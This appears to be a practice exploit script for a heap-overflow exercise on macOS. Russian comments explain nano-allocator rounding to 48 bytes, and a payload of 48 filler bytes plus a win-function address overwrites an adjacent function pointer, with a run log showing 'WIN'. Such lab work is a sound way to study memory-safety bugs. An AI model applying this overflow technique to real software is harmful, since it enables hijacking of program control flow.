from pwn import *


"""
in source:

typedef struct {
    char data[32];
    void (*fn)(void);
} chunk;

typedef struct {
    void (*fn)(void);
    char msg[32];
} handler;

~ size of chunk = 48 
маллок дает не 40 байтов, а 48 из за того, что на mac os x malloc использует nano allocator или tiny allocator, в зависимости от размера.
Нано-аллокатор использует классы по 16 байт.

структуры <16 байт → округляются до 16
структуры <32 байт → 32
структуры <48 байт → 48
структуры <64 байт → 64

то есть нам нужно заполнить память так:
data + fn + meta_info + addr_in_handler

32   + 8  + 8         + addr_of_win
^      ^    ^
|      |    |
+-----------+
|    buf    |
+-----------+



"""


p = b"A"*48 + p64(0x1000004b0)
print(p)



"""
╰─ aslrbp -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb0\x04\x00\x00\x01\x00\x00\x00' ./2
a: 0x100611ae0
h: 0x100611b10
&h->fn: 0x100611b10
&h->msg: 0x100611b18
&a->data: 0x100611ae0
win: 0x1000004b0
safe: 0x1000004d8
read into a->data:
read 56 bytes
calling h->fn()
WIN
1    1.c    1.py    2    2.c    2.py    aslrbp
"""
